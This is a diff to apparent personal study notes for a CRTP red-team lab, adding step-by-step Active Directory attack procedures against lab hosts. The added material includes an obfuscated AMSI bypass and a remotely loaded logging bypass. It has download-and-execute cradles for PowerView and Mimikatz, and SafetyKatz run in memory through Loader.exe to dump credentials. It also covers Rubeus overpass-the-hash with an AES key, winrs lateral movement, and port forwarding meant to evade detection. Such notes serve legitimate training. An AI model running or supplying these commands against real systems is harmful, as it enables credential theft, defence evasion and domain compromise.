@@ -4,7 +4,9 @@
 
 # Tips
 1. Admin on another machine use `"winrs"`
-2. 
+2. student1 is Admin on another machine (adminsrv) use `"Enter-PSSession"` to get a shell; use MimiEx to extract the credentials of adminsrv; perform overpassthehash to start cmd process as adminsrv; check if adminsrv has admin access on dcorp-mgmt yes we have; run SafetyKatz.exe on adminsrv process but you need loader.exe; copy loader.exe to adminsrv; enter dcorp-mgmt using winrs; check if port forwarding is still there; run the command of SafetyKatz.exe using loader.exe; extract the credentials
+3. have an Admin Session use `"winrs"`; use SafetyKatz.exe to extract credentials; use Rubes.exe to start cmd
+   
 
 ### To bypass AV in the cmd
 1. launch cmd
@@ -66,6 +68,7 @@ PowerShell set-MpPreference -DisableAutoExclusions $true
 ```
 ### Load Script in memory to bypass Windows Defender
 ```
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
 iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
 iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
 ```
@@ -1634,6 +1637,128 @@ Invoke-BloodHound -Stealth
 SharpHound.exe --stealth
 ```
 
+
+
+# Abusing Admin Sessions then extract the credentials using SafetyKatz
+### Using access to dcorp-ci
+1. open a new cmd and bypass Enhanced Script Block Logging
+```
+iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
+```
+2. Bypass AMSI
+```
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),' s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+3. Download and execute PowerView in memory
+```
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
+```
+4. Enumerate Admin Sessions
+```
+Find-DomainUserLocation
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/29ec214d-99b5-431c-8971-29cce5b858d5)
+
+5. Abuse using winrs
+```
+winrs -r:dcorp-mgmt hostname;whoami
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/362b9a23-69af-4b62-860e-9e5cbd1f714b)
+
+6. Download Loader.exe on the current machine then copy it to the new machine that has a session
+Loader.exe can be used to load the Reflective DLL for SafetyKatz into memory. This helps in executing SafetyKatz without writing it to disk, making it harder for traditional security tools to detect its presence.
+```
+iwr http://10.0.2.10:9002/Loader.exe -OutFile C:\Users\machine2\Downloads\Loader.exe
+```
+7. copy the Loader.exe from your machine to dcorp-mgmt
+```
+echo F | xcopy C:\Users\machine2\Downloads\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2b8169a9-e104-4231-a05d-622d99c55c2a)
+8. Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt. it will detect because we are downloading and executing an exe file webserver
+```
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c69fd2c-82a6-4322-948b-6e8991e782f2)
+
+9. Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
+```
+$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+10. we got credentials of svcadmin. Note that svcadmin is used as a service account (see `Session: Service from 0`) on dcorp-mgmt. copy `aes256_hmac` and launch a new cmd with administrative privilege
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/06c9ce58-0757-4eb9-9c3a-7fecab8c1516)
+
+11. use overpassthehash to start a session as svcadmin
+```
+>C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+12. a new cmd will be opened using svcadmin privilege, however if you try `whoami` it will show student1. to use svcadmin on dcorp-mgmt you need to use `winrs`
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e9772e3b-edda-467d-83a5-382d7b219757)
+
+### Using derivative local admin
+derivative means if student1 has access to adminsrv machine; adminsrv has access to mgmt machine; means student1 has access to mgmt
+1. check if you have a local admin access on adminsrv machine
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/09723692-ffd9-4936-9576-02ee2356e5a5)
+
+2. access adminsrv
+```
+Enter-PSSession -ComputerName dcorp-adminsrv
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/82513bd6-f3aa-43fb-98f5-1288812cf39b)
+
+3. bypass AMSI
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/443bb981-776c-4a17-836f-7b85e6b1bef9)
+
+you will get an error
+4. check your current language mode
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/22856650-5eb3-4657-bbd3-55a14f20fef3)
+
+5. check if the Applocker exists in the machine
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/107bafb5-9fd6-43ad-8de9-1f8e2d9f3813)
+
+Always check the PathConditions, Description, Action
+
+Here, Everyone can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them.
+
+6. on student machine copy Invoke-MimiEx.ps1 to the adminsrv
+```
+Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+7. Enter adminsrv again
+```
+Enter-PSSession -ComputerName dcorp-adminsrv
+```  
+8. run Invoke-MimiEx.ps1
+```
+.\Invoke-MimiEx.ps1
+```
+9. copy the aes of the srvadmin then use SafetyKatz to perform overpassthehash
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/81129a82-469a-4cdb-8012-ea28c51fd15b)
+
+10. check again if adminsrv has admin access on dcorp-mgmt
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c473f73d-13dd-4306-bd5b-1bda2b407c53)
+
+11. copy loader.exe to the dcorp-mgmt
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bfff4a9a-4349-4e9d-8874-679852a1f1b1)
+
+12. connect to dcorp-mgmt as adminsrv using winrs
+```
+winrs -r:dcorp-mgmt cmd
+```
+
+13. setup port forwarding and then download SafetyKatz.exe on the dcorp-mgmt machine then execute it
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c111f209-65e4-4dee-a230-947385232740)
+
+14. you will get the credentials 
 
 
 # Runas
